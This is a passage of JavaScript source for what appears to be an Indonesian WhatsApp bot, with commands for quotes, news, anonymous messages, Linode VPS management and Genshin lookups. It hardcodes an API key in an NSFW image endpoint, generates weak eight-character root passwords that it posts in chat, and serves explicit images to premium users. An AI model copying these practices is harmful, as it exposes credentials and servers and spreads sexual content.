if (!transactionId) return reply(`Contoh: ${cmd} id_transaksi`)
const transaction = getTrId(transactionId)
if (!transaction) {
return reply(`Transaksi dengan ID "${transactionId}" tidak ditemukan`)
}
if (transaction.status !== 'process') {
return reply('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer')
}

const products = getprodukDariFile()
const product = products.find(p => p.nama.toLowerCase() === transaction.productName.toLowerCase())
if (product) {
product.stok += transaction.jumlah
simpenProduknya(products)
}
transaction.status = 'canceled'
simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
reply(`Transaksi dengan ID "${transactionId}" telah dibatalkan`)
}
break
  
// ============QUOTES ////////*////////**/*)/
case 'dilan':
    case 'quotesdilan': {

let tod = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotesdilan.json`)
      const dilan = await pickRandom(tod)
      sock.sendMessage(m.chat, {
        text: dilan.quotes
      }, {
        quoted: fakeQuoted
      })
    }
    break
    case 'bucin':
    case 'quotesbucin': {

const bucin = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/bucin.json`)
      const bucc = await pickRandom(bucin)
      sock.sendMessage(m.chat, {
        text: bucc
      }, {
        quoted: fakeQuoted
      })
    }
    break
    case 'quotesanime': {

const quotesanim = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotesanime.json`)
      const anu = await pickRandom(quotesanim)
      let teks = `*Quotes Anime*\n\n"${anu.quotes}"\n\n*${anu.char_name}*\n_${anu.anime} (${anu.episode})_\n_${anu.date}_`
      let coo = `{\"display_text\":\"Url Quotes\",\"id\":\"P\",\"copy_code\":\"${anu.url}\"}`
      reply(m.chat, teks, coo, null, m)
    }
    break
    case 'quotesislamic': {

const islamic = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotesislamic.json`)
      const quotesislamic = await pickRandom(islamic)
      reply(`${quotesislamic}`)
    }
    break
    case 'faktaunik': {

const fakta = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/faktaunik.json`)
      const faktaunik = await pickRandom(fakta)
      reply(`*Taukah Kamu?*\n\n${faktaunik}`)
    }
    break
    case 'katasenja': {

const senja = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katasenja.json`)
      const katasenja = await pickRandom(senja)
      reply(`${katasenja}`)
    }
    break
    case 'katailham': {

const ilham = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katailham.json`)
      const katailham = await pickRandom(ilham)
      reply(`${katailham}`)
    }
    break
    case 'quotes': {

const quot = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotes.json`)
      const quote = await pickRandom(quot)
      reply(`${quote.quotes}\n\nBy ${quote.author}`)
    }
    break
    case 'puisi': {

const puis = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/puisi.json`)
      const puisi = await pickRandom(puis)
      reply(`${puisi}`)
    }
    break
    case 'pantun': {

const pant = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/pantun.json`)
      const pantun = await pickRandom(pant)
      reply(`${pantun}`)
    }
    break
    case 'motivasi': {

const motiv = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/motivasi.json`)
      const motivasi = await pickRandom(motiv)
      reply(`${motivasi}`)
    }
    break
    /* MENFESS */
    case"confes": case "menfes":case 'menfess': case 'confess': {

if (!isPrivate) return reply(`Khusus Di Private Chat!!`)
      global.menfess = global.menfess ? global.menfess : {}
      if (!text) return reply(` ${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let [jid, name, msg] = text.split`|`
      if ((!jid || !name || !msg)) return reply(`${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let p = (await sock.onWhatsApp(jid))[0] || {}
      if (!p.exists) return reply('âŒ Nomer Yang Kamu Masukan Salah')
      if (p.jid == m.sender) return reply('Itu Nomer Lu Dodol!!')
      let mf = Object.values(global.menfess).find(mf => mf.status === true)
      if (mf) return !0
         let heri = `${monospa(`${name.trim()}`)}`
         let id = +new Date
         let txt = `ğŸ“¨ Hay kamu dapat pesan dari seseorang ğŸ‘‹ \n\nnama: *${name.trim()}*\n\nPesan: `
         txt += `_${msg.trim()}_\n\n${readmore}Mau balas pesan ini kak? bisa kok kak. tinggal ketik pesannya kakak lalu kirim, nanti saya sampaikan ke ${heri}`
         
             await sock.sendMessage(p.jid, {
    text: txt,
    contextInfo: {
      externalAdReply: {
        title: 'Confess',
        body: '',
        thumbnailUrl: 'https://telegra.ph/file/5413eed27c6af00fa7273.jpg',
        sourceUrl: null,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }).then(() => {
 reply(`*Berhasil Mengirim Pesan Menfess!!*`)       
            global.menfess[id] = {
               id,
               from: m.sender,
               name,
               receiver: p.jid,
               msg,
               status: false
            }
            return !0
         })
   }
break
/* BERITA */ 
case "antara": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/antara")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const category = firstNews.category
const artikel = firstNews.type
const teks = `
*ANTARA*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: `ANTARA`,
serverId: 200
}, 
externalAdReply: {
title: `antara â€¢ `+artikel, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: fakeQuoted })
}
break
case "cnbc":
case "cnbcindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/cnbcindonesia")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const category = firstNews.category
const date = firstNews.date
const teks = `
*CNBC*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `cnbc â€¢ `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: fakeQuoted })
}
break
case "cnn":
case "cnnindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/cnn")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image_full
const content = firstNews.content
const date = firstNews.time
const teks = `
*CNN*
- ${title}
- ${content}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `cnn â€¢ `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: fakeQuoted })
}
break
case "kompasIndonesia":
case "kompas": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/kompas")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const category = firstNews.category
const artikel = firstNews.date
const teks = `
*KOMPAS*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: `ANTARA`,
serverId: 200
}, 
externalAdReply: {
title: `kompas â€¢ `+artikel, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: fakeQuoted })
}
break
case "merdeka":
case "merdekaindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/merdeka")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const content = firstNews.description
const date = firstNews.date
const teks = `
*MERDEKA*
- ${title}
- ${content}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `merdeka â€¢ `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: fakeQuoted })
}
break
case "sindonews":
case "sindonewsindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/sindonews")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.imageUrl
const category = firstNews.category
const date = firstNews.timestamp
const teks = `
*SINDONEWS*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `sindonews â€¢ `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: fakeQuoted })
}
break
case "suara":
case "suaraindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/suara")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const category = firstNews.category
const date = firstNews.date
const teks = `
*SUARA*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `suara â€¢ `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: fakeQuoted })
}
break
/* RANDOM */
case "randombluearchiver":
case "bluearchiver": {
if (!isPremium) return reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/blue-archive";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomchina":
case "china": {
if (!isPremium) return reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/china";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomindo":
case "indo": {
if (!isPremium) return reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/indonesia";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomwaifu":
case "waifu": {
if (!isPremium) return reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/waifu";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomneko":
case "neko": {
if (!isPremium) return reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/neko";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomvietnam":
case "vietnam": {
if (!isPremium) return reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/vietnam";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomthailand":
case "thailand": {
if (!isPremium) return reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/thailand";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomkorea":
case "korea": {
if (!isPremium) return reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/korea";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomjapan":
case "japan": {
if (!isPremium) return reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/japan";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
/* LINODE */
case 'linode2gb': {
      if (!isOwner) return reply(mess.owner)
      try {
        let linodeData = {
          label: `${args[0]}`,
          region: 'ap-south',
          type: 'g6-standard-1',
          image: 'linode/ubuntu20.04',
          root_pass: randomKarakter(5) + randomNomor(3),
          stackscript_id: null,
          authorized_keys: null,
          backups_enabled: false
        };

        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify(linodeData)
        });

        const responseData = await response.json();

        if (response.ok) {
          const linodeId = responseData.id;
          reply(`Tunggu Sebentar...`);
          await new Promise(resolve => setTimeout(resolve, 60000));

          const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${linodeToken}`
            }
          });

          const linodeInfo = await linodeResponse.json();
          const ipAddress = linodeInfo.ipv4[0];

          let messageText = `Linode berhasil dibuat!\n\n`;
          messageText += `ID: ${linodeId}\n`;
          messageText += `IP Linode: ${ipAddress}\n`;
          messageText += `Password: ${linodeData.root_pass}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
      }
    }
    break

    case 'linode4gb': {
      if (!isOwner) return reply(mess.owner)
      try {
        let linodeData = {
          label: `${args[0]}`,
          region: 'ap-south',
          type: 'g6-standard-2',
          image: 'linode/ubuntu20.04',
          root_pass: randomKarakter(5) + randomNomor(3),
          stackscript_id: null,
          authorized_keys: null,
          backups_enabled: false
        };

        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify(linodeData)
        });

        const responseData = await response.json();

        if (response.ok) {
          const linodeId = responseData.id;
          reply(`Tunggu Sebentar...`);
          await new Promise(resolve => setTimeout(resolve, 60000));

          const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${linodeToken}`
            }
          });

          const linodeInfo = await linodeResponse.json();
          const ipAddress = linodeInfo.ipv4[0];

          let messageText = `Linode berhasil dibuat!\n\n`;
          messageText += `ID: ${linodeId}\n`;
          messageText += `IP Linode: ${ipAddress}\n`;
          messageText += `Password: ${linodeData.root_pass}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
      }
    }
    break

    case 'linode8gb': {
      if (!isOwner) return reply(mess.owner)
      try {
        let linodeData = {
          label: `${args[0]}`,
          region: 'ap-south',
          type: 'g6-standard-4',
          image: 'linode/ubuntu20.04',
          root_pass: randomKarakter(5) + randomNomor(3),
          stackscript_id: null,
          authorized_keys: null,
          backups_enabled: false
        };

        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify(linodeData)
        });

        const responseData = await response.json();

        if (response.ok) {
          const linodeId = responseData.id;
          reply(`Tunggu Sebentar...`);
          await new Promise(resolve => setTimeout(resolve, 60000));

          const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${linodeToken}`
            }
          });

          const linodeInfo = await linodeResponse.json();
          const ipAddress = linodeInfo.ipv4[0];

          let messageText = `Linode berhasil dibuat!\n\n`;
          messageText += `ID: ${linodeId}\n`;
          messageText += `IP Linode: ${ipAddress}\n`;
          messageText += `Password: ${linodeData.root_pass}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
      }
    }
    break

    case 'linode16gb': {
      if (!isOwner) return reply(mess.owner)
      try {
        let linodeData = {
          label: `${args[0]}`,
          region: 'ap-south',
          type: 'g6-standard-8',
          image: 'linode/ubuntu20.04',
          root_pass: randomKarakter(5) + randomNomor(3),
          stackscript_id: null,
          authorized_keys: null,
          backups_enabled: false
        };

        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify(linodeData)
        });

        const responseData = await response.json();

        if (response.ok) {
          const linodeId = responseData.id;
          reply(`Tunggu Sebentar...`);
          await new Promise(resolve => setTimeout(resolve, 60000));

          const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${linodeToken}`
            }
          });

          const linodeInfo = await linodeResponse.json();
          const ipAddress = linodeInfo.ipv4[0];

          let messageText = `Linode berhasil dibuat!\n\n`;
          messageText += `ID: ${linodeId}\n`;
          messageText += `IP Linode: ${ipAddress}\n`;
          messageText += `Password: ${linodeData.root_pass}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
      }
    }
    break

    case 'listlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        const responseData = await response.json();

        if (response.ok) {
          let messageText = 'Daftar Linode VPS:\n\n';
          responseData.data.forEach(linode => {
            messageText += `ID: ${linode.id}\n`;
            messageText += `Label: ${linode.label}\n`;
            messageText += `IP: ${linode.ipv4[0]}\n\n`;
          });

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal mendapatkan daftar Linode.`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat mendapatkan daftar Linode: ${err}`);
      }
    }
    break

    case 'onlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/boot`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        if (response.ok) {
          reply(`Linode dengan ID ${linodeId} berhasil dihidupkan.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal menghidupkan Linode: ${responseData.errors[0]?.reason || 'Unknown Error'}`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat menghidupkan Linode: ${err}`);
      }
    }
    break

    case 'offlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        if (response.ok) {
          reply(`Linode dengan ID ${linodeId} berhasil dimatikan.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mematikan Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat mematikan Linode: ${err}`);
      }
    }
    break

    case 'rebootlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/reboot`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        if (response.ok) {
          reply(`Linode dengan ID ${linodeId} berhasil di-restart.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal me-restart Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat me-restart Linode: ${err}`);
      }
    }
    break

    case 'rebuildlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const image = args[1];
        const rootPassword = randomKarakter(4) + randomNomor(3);

        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify({
            image,
            root_pass: rootPassword
          })
        });

        if (response.ok) {
          reply(`Linode dengan ID ${linodeId} berhasil di-rebuild dengan image ${image}. Password root baru: ${rootPassword}`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal rebuild Linode: ${responseData.errors[0]?.reason || 'Unknown Error'}`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat rebuild Linode: ${err}`);
      }
    }
    break

    case 'delinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'DELETE',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        if (response.ok) {
          reply(`Linode dengan ID ${linodeId} berhasil dihapus.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal menghapus Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat menghapus Linode: ${err}`);
      }
    }
    break

    case 'saldolinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const response = await fetch('https://api.linode.com/v4/account', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        const accountInfo = await response.json();

        if (response.ok) {
          const balance = accountInfo.balance / 100;
          const credit = accountInfo.credit_remaining / 100;

          let messageText = `Saldo Akun Linode:\n\n`;
          messageText += `- Balance: $${balance.toFixed(2)}\n`;
          messageText += `- Credit Remaining: $${credit.toFixed(2)}\n`;

          reply(messageText);
        } else {
          throw new Error(`Gagal mendapatkan saldo Linode.`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat memeriksa saldo Linode: ${err}`);
      }
    }
    break

    case 'sisalinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        const responseData = await response.json();

        if (response.ok) {
          const totalLinodes = responseData.data.length;
          reply(`Total Linode yang aktif: ${totalLinodes}`);
        } else {
          throw new Error(`Gagal mendapatkan data Linode.`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat memeriksa jumlah Linode: ${err}`);
      }
    }
    break

    case 'cekvpslinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        const linodeInfo = await response.json();

        if (response.ok) {
          let messageText = `Detail Linode:\n\n`;
          messageText += `ID: ${linodeInfo.id}\n`;
          messageText += `Label: ${linodeInfo.label}\n`;
          messageText += `Status: ${linodeInfo.status}\n`;
          messageText += `Region: ${linodeInfo.region}\n`;
          messageText += `Type: ${linodeInfo.type}\n`;
          messageText += `IP: ${linodeInfo.ipv4.join(', ')}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal mendapatkan detail Linode.`);
        }
      } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat memeriksa detail Linode: ${err}`);
      }
    }
    break
// ============Nsfw
    case 'waifu':
    case 'neko':
    case 'shinobu':
    case 'megumin':
    case 'bully':
    case 'cuddle':
    case 'cry':
    case 'hug':
    case 'awoo':
    case 'kiss':
    case 'lick':
    case 'pat':
    case 'smug':
    case 'bonk':
    case 'yeet':
    case 'blush':
    case 'smile':
    case 'wave':
    case 'highfive':
    case 'handhold':
    case 'nom':
    case 'bite':
    case 'glomp':
    case 'slap':
    case 'kill':
    case 'happy':
    case 'wink':
    case 'poke':
    case 'dance':
    case 'cringe':
    case 'trap':
    case 'blowjob':
    case 'hentai':
    case 'boobs':
    case 'ass':
    case 'pussy':
    case 'thighs':
    case 'lesbian':
    case 'lewdneko':
    case 'cum': {
      if (!isOwner && !isPremium) return reply(mess.prem)
      reply("Loading ğŸ”")
        const haha = `https://api.zeeoneofc.my.id/api/nsfw/${command}?apikey=QIO8xicLNkEV43Y`
          sock.sendMessage(m.chat, {
            image: {
              url: haha
            },
            caption: name
          }, {
            quoted: fakeQuoted
          })
    break
    }
    // ============Genshin
    case 'genshin-wildlife':
    case 'g-wildlife':
    case 'gens-wildlife': {
      
      if (!text) return reply(`Contoh: *${prefix + command} snowboar*\nHarap berikan nama binatang liar.`);
      try {
        let result = await genshindb.wildlife(text);
        if (result) {
          let response = `*Binatang Liar Ditemukan: ${result.name}*\n\n` + `_${result.description || "Data tidak tersedia"}_\n\n` + `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n` + `*Habitat:* ${result.habitat || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Binatang liar tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.wildlife("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Binatang liar yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-weapons':
    case 'g-weapons':
    case 'gens-weapons': {
      
      if (!text) return reply(`Contoh: *${lrefix + command} claymore*\nHarap berikan nama senjata.`);
      try {
        let result = await genshindb.weapons(text);
        if (result) {
          let response = `*Senjata Ditemukan: ${result.name}*\n\n` + `_${result.description || "Data tidak tersedia"}_\n\n` + `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n` + `*Type:* ${result.type || "Data tidak tersedia"}\n` + `*Base ATK:* ${result.baseAttack || "Data tidak tersedia"}\n` + `*Substat:* ${result.subStat || "Data tidak tersedia"}\n` + `*Passive Name:* ${result.passiveName || "Data tidak tersedia"}\n` + `*Passive Description:* ${result.passiveDescription || "Data tidak tersedia"}\n` + (result.refinement ? `\n*Refinement (${result.refinement.refine}):* ${result.refinement.description || "Data tidak tersedia"}\n` : "");
          reply(response);
        } else {
          reply("Senjata tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.weapons("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Senjata yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-voiceovers':
    case 'g-voiceovers':
    case 'gens-voiceovers': {
      
      if (!text) return reply(`Contoh: *${prefix + command} venti*\nHarap berikan nama voiceover.`);
      try {
        let result = await genshindb.voiceovers(text);
        if (result) {
          let response = `*Voiceover Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Voiceover tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.voiceovers("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Voiceover yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-viewpoint':
    case 'g-viewpoint':
    case 'gens-viewpoint': {
      
      if (!text) return reply(`Contoh: *${prefix + command} starfell valley*\nHarap berikan nama pemandangan.`);
      try {
        let result = await genshindb.viewpoints(text);
        if (result) {
          let response = `*Pemandangan Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Region:* ${result.region || "Data tidak tersedia"}\n`;
          response += `*Area:* ${result.area || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Pemandangan tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.viewpoints("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Pemandangan yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-talents':
    case 'g-talents':
    case 'gens-talents': {
      
      if (!text) return reply(`Contoh: *${prefix + command} diluc*\nHarap berikan nama karakter untuk mencari bakatnya.`);
      try {
        let result = await genshindb.talents(text);
        if (result && result.length > 0) {
          let response = `*Bakat ditemukan untuk karakter ${text}:*\n\n`;
          result.forEach((talent, index) => {
            response += `*${index + 1}. ${talent.name}*\n`;
            response += `_${talent.description || "Deskripsi tidak tersedia"}_\n\n`;
            response += `*Jenis:* ${talent.type || "Data tidak tersedia"}\n`;
